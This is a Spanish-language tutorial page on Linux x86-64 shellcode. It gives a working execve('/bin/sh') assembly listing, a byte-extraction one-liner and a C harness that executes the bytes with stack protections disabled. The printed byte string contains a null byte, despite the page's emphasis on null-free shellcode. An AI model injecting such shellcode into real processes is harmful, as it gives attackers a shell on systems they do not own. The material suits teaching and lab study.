# Shellcode Basics

<figure class="hero-image" markdown>
  ![Shellcode](../../assets/images/malware-hero.svg){ width="100%" }
</figure>

Fundamentos de desarrollo de shellcode para Linux x86-64.

---

## ¿Qué es shellcode?

Shellcode es código máquina diseñado para ser inyectado y ejecutado en el contexto de otro proceso.

### Características

- **Position Independent**: no depende de direcciones fijas
- **Null-free**: evita bytes nulos (`0x00`)
- **Pequeño**: menor tamaño posible

---

## Syscall en x86-64

En Linux x86-64, las syscalls se invocan con la instrucción `syscall`:

| Registro | Propósito |
|----------|-----------|
| `rax` | Número de syscall |
| `rdi` | Argumento 1 |
| `rsi` | Argumento 2 |
| `rdx` | Argumento 3 |
| `r10` | Argumento 4 |
| `r8` | Argumento 5 |
| `r9` | Argumento 6 |

---

## execve("/bin/sh")

```nasm
; Linux x86-64 execve("/bin/sh")
; nasm -f elf64 shell.asm -o shell.o
; ld shell.o -o shell

global _start

section .text
_start:
    ; Limpiar registros
    xor rax, rax
    xor rdx, rdx        ; envp = NULL
    xor rsi, rsi        ; argv = NULL
    
    ; Push "/bin/sh" a la pila
    push rax            ; null terminator
    mov rbx, 0x68732f6e69622f  ; "/bin/sh" en little-endian
    push rbx
    
    ; rdi = pointer a "/bin/sh"
    mov rdi, rsp
    
    ; execve(rdi, rsi, rdx)
    mov al, 59          ; syscall number para execve
    syscall
```

### Extraer bytes

```bash
objdump -d shell.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | tr -d '\n'
```

---

## Evitar null bytes

```nasm
; MAL - contiene null bytes
mov rax, 0x3b           ; 48 c7 c0 3b 00 00 00

; BIEN - sin null bytes  
xor rax, rax
mov al, 0x3b            ; 48 31 c0 b0 3b
```

---

## Testear shellcode

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6"
    "\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73"
    "\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode length: %zu\n", strlen(shellcode));
    
    void (*sc)() = (void(*)())shellcode;
    sc();
    
    return 0;
}
```

```bash
gcc -z execstack -fno-stack-protector -o test test.c
./test
```

---

!!! danger "Solo en entornos controlados"
    Ejecutar shellcode solo en máquinas virtuales o entornos de laboratorio.

---

!!! recursos "Referencias"
    - [Syscall Table x86-64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
    - [Shell-Storm Shellcode DB](http://shell-storm.org/shellcode/)
